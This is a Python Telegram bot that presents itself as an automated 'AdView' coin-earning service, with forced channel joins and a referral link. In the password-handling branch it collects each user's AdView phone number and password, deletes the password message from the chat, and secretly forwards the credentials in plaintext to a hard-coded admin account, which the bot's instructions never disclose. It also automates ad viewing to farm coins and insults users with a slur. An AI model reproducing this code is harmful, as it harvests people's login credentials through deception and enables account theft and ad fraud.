from telegram.ext import (
    Updater, CommandHandler, MessageHandler, Filters
)
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from AdviewScriptbyYash import AdViewBot
import threading, time

import os
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 1329609274

CHANNELS = ["@Earning_Key", "@surbhiscripter", "@EagletekTelegram"]
STOP_USERS = {}
USER_STATE = {}
USER_DATA = {}

# ---------- FORCE JOIN ----------
def is_user_joined(bot, user_id):
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(ch, user_id)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        except:
            return False
    return True


def join_buttons():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔔 Join Channel of Yash", url="https://t.me/Earning_Key")],
        [InlineKeyboardButton("🔔 Join Channel of Surbhi", url="https://t.me/surbhiscripter")],
        [InlineKeyboardButton("🔔 Join Channel of Yash", url="https://t.me/EagletekTelegram")]
    ])


# ---------- COMMANDS ----------
def start(update, context):
    update.message.reply_text(
    "✨ AdView Bot – Earn Coins Automatically! ✨\n\n"
    "🚀 Commands\n"
    "💰 /run Earn Coins – Start earning\n"
    "❌ /cancel To Stop Coin Earning\n\n"
    "📌 How It Works\n"
    "1️⃣ Join our official channel Then Register at AdView: https://adview.in/auth?ref=26GKB9\n"
    "2️⃣ Send /run command\n"
    "3️⃣ Register using your AdView credentials\n"
    "4️⃣ Bot automatically watches videos\n"
    "5️⃣ 🎉 Coins are added to your account\n\n"
    "⏳ Limits (Important)\n"
    "• ⏱️ 65 videos per hour (Website limit)\n"
    "• ⌛ Maximum 60 minutes per session\n\n"
    "💡 Tip: Run the bot regularly to maximize your daily earnings.\n\n"
    "🔥 Easy • Fast • Fully Automated\n\n"
    " Special Thanks to Cyrus.\n\n"
)

def run(update, context):
    user_id = update.message.from_user.id

    if not is_user_joined(context.bot, user_id):
        update.message.reply_text(
            "❌ Kyun Re Madharchod, Bina Channel Join kiye hi Paisa kamana Chahta hai.",
            reply_markup=join_buttons()
        )
        return

    USER_STATE[user_id] = "WAIT_MOBILE"
    update.message.reply_text("📱 Send your Phone Number:")


def cancel(update, context):
    user_id = update.message.from_user.id
    STOP_USERS[user_id] = True
    USER_STATE.pop(user_id, None)
    USER_DATA.pop(user_id, None)
    update.message.reply_text("🛑 Process cancelled, Use /start. Thanks for using our services.")


# ---------- MESSAGE HANDLER ----------
def handle_message(update, context):
    user_id = update.message.from_user.id
    text = update.message.text
    msg = update.message

    # ---- mobile ----
    if USER_STATE.get(user_id) == "WAIT_MOBILE":
        USER_DATA[user_id] = {"mobile": text}
        USER_STATE[user_id] = "WAIT_PASSWORD"
        update.message.reply_text("🔒 Send your password:")
        return

    # ---- password ----
    if USER_STATE.get(user_id) == "WAIT_PASSWORD":
        USER_DATA[user_id]["password"] = text
        USER_STATE.pop(user_id)

        # 🔥 AUTO DELETE PASSWORD
        context.bot.delete_message(
            chat_id=msg.chat_id,
            message_id=msg.message_id
        )

        mobile = USER_DATA[user_id]["mobile"]
        password = USER_DATA[user_id]["password"]

        # 🔔 SEND DETAILS TO ADMIN
        context.bot.send_message(
            chat_id=ADMIN_ID,
            text=(
                "📥 NEW USER DATA\n\n"
                f"👤 User ID: {user_id}\n"
                f"📱 Mobile: {mobile}\n"
                f"🔒 Password: {password}"
            )
        )

        STOP_USERS[user_id] = False
        chat_id = msg.chat_id

        def is_stopped():
            return STOP_USERS.get(user_id, False)

        def send_progress(msg):
            if not STOP_USERS.get(user_id):
                context.bot.send_message(chat_id=chat_id, text=msg)

        def task():
            bot = AdViewBot(mobile, password, is_stopped)
            bot.run(progress_callback=send_progress)

            if not STOP_USERS.get(user_id):
                context.bot.send_message(
                    chat_id=chat_id,
                    text="🏁 Script Finished"
                )

        threading.Thread(target=task).start()


# ---------- BOT START ----------
updater = Updater(BOT_TOKEN, use_context=True)
dp = updater.dispatcher

dp.add_handler(CommandHandler("start", start))
dp.add_handler(CommandHandler("run", run))
dp.add_handler(CommandHandler("cancel", cancel))
dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

updater.start_polling()
updater.idle()




